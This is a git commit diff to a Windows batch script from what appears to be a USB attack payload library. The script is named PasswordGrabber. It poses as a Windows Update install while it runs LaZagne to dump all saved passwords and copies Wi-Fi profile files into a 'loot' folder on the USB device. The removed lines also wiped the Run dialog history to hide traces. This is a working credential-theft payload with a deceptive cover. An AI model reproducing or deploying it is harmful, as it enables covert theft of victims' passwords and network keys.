b32c5ea0ade24eba2367618f2679d1d20a64a14d
RazerBlade <carlval@hotmail.se>
2017-11-17 16:16:17 +0100

    Removes clutter and fixes datetime

--- payloads/library/credentials/PasswordGrabber/e.cmd
+++ payloads/library/credentials/PasswordGrabber/e.cmd
@@ -1,34 +1,20 @@
 @echo off
 @echo Installing Windows Update
 
-REM Delete registry keys storing Run dialog history
-REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
-
-REM Creates directory compromised of computer name, date and time
-REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
-
-REM This executes LaZagne in the current directory and outputs the password file to Loot
-REM Time and Date is also added
 setlocal
 cd /d %~dp0
-%~dp0\laZagne.exe all -vV > "%~dp0\..\..\loot\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%_passwords.txt"
 
-REM These lines if you just want Passwords and no files.
-set dst=%~dp0\..\..\loot\USB_Exfiltration\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
+REM Time and Date
+set drec=%COMPUTERNAME%_%date%_%time%
+set dst=%~dp0\..\..\loot\USB_Exfiltration\%drec%
 mkdir %dst% >>nul
 
-if Exist %USERPROFILE%\Documents (
-REM /C Continues copying even if errors occur.
-REM /Q Does not display file names while copying.
-REM /G Allows the copying of encrypted files to destination that does not support encryption.
-REM /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
-REM /E Copies directories and subdirectories, including empty ones.
+REM This executes LaZagne in the current directory and outputs the password file to Loot
+%~dp0\laZagne.exe all -v > "%~dp0\..\..\loot\USB_Exfiltration\%drec%\passwords.txt"
 
-REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul
 
-REM Same as above but does not create empty directories
-REM xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.flac %dst% >>nul
-
+if Exist c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\* (
+xcopy /C /Q /G /Y /E c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\* %dst% >>nul
 )
 
 REM Blink CAPSLOCK key
